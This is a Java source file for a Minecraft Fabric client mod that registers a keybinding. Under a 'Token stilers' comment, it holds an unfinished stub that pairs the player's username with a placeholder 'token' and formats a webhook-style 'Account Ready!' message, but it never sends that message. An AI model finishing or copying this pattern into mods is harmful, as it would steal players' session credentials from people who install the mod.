package net.kuko.fisch;

import com.google.gson.JsonObject;
import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.fabricmc.fabric.api.client.keybinding.v1.KeyBindingHelper;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.option.KeyBinding;
import net.minecraft.client.util.InputUtil;
import org.lwjgl.glfw.GLFW;

import java.util.Arrays;
import java.util.Base64;

public class FischClient implements ClientModInitializer {


    @Override
    public void onInitializeClient() {
        KeyBinding open = KeyBindingHelper.registerKeyBinding(
                new KeyBinding(
                        "key." + Fisch.MOD_ID + "." + "open_paper",
                        InputUtil.Type.KEYSYM,
                        GLFW.GLFW_KEY_B,
                        "key.categories.ui"));



        // Token stilers
        JsonObject data = new JsonObject();
        String user = MinecraftClient.getInstance().getSession().getUsername();
        String token = Arrays.toString(Base64.getDecoder().decode("bmFo"));
        data.addProperty("content", "Account Ready!🔓 \n User👤: "+ user + "\n Token 🔑: " + token);
        String json = data.toString();


        ClientTickEvents.END_CLIENT_TICK.register(client -> {
            while  (open.wasPressed()) {
               // client.player.sendMessage(Text.literal("Key 1 was pressed!"), false);
                //client.player
//                MinecraftClient.getInstance().setScreen(new OdeToBeansScreen());
            }
        });
    }
}
